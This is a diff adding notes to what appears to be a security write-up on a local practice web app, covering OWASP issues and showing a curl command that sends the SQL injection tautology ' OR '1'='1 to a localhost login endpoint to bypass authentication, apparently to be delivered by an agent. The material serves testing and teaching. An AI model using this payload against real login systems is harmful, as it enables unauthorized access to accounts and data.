@@ -152,3 +152,25 @@ attackers can figure out more about the database and organization of it based on
 ## 5. Broken Access Control (OWASP #1)
 
 when user not logged in and they go to /security, there are old credentials lying there...
+
+
+------------------------------------------------------------------------------
+
+## Notes on Command line interface with website! (This will be how the agent puts in the malicious injections)
+
+the application processes parameters via query strings on a `GET` request, an attacker can bypass authentication using `curl` and a classic tautology payload (`' OR '1'='1`):
+
+```bash
+curl --get \
+  --data-urlencode "username=' OR '1'='1" \
+  --data-urlencode "password=' OR '1'='1" \
+  "http://127.0.0.1:5000/login"
+```
+
+Normal example:
+```bash
+curl --get \
+  --data-urlencode "username=alice" \
+  --data-urlencode "password=password123" \
+  "http://127.0.0.1:5000/login"
+```
